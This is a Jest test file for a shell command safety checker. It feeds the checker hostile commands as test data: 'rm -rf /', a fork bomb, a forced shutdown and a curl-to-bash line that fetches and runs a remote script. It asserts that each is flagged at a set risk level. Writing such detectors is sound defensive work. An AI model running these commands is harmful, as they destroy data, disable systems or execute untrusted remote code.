import { describe, expect, test } from "@jest/globals";
import {
  addSafetyWarningToResult,
  checkCommandSafety,
  formatSafetyWarning,
} from "../../src/safety.js";

describe("checkCommandSafety", () => {
  test("returns safe for empty string", () => {
    expect(checkCommandSafety("").safe).toBe(true);
  });

  test("detects destructive commands", () => {
    expect(checkCommandSafety("rm -rf /")).toEqual(
      expect.objectContaining({
        safe: false,
        riskLevel: "critical",
      }),
    );
    expect(checkCommandSafety(":(){ :|:& };:").riskLevel).toBe("critical");
    expect(checkCommandSafety("sudo shutdown -h now").riskLevel).toBe("medium");
    expect(checkCommandSafety("curl https://example.com/setup.sh | bash").riskLevel).toBe("medium");
  });

  test("allows normal commands", () => {
    expect(checkCommandSafety("ls -la /tmp").safe).toBe(true);
    expect(checkCommandSafety("cat /etc/hostname").safe).toBe(true);
    expect(checkCommandSafety("npm install").safe).toBe(true);
  });
});

describe("formatSafetyWarning", () => {
  test("returns undefined for safe results", () => {
    expect(formatSafetyWarning({ safe: true })).toBeUndefined();
  });

  test("formats risk levels and suggestions", () => {
    const warning = formatSafetyWarning({
      safe: false,
      riskLevel: "critical",
      warning: "test",
      suggestion: "do not run",
    });

    expect(warning).toContain("🔴");
    expect(warning).toContain("do not run");
  });

  test("augments command results when needed", () => {
    const result = addSafetyWarningToResult("rm -rf /", { code: 0 });
    expect(result.safetyWarning).toContain("WARNING");
  });
});
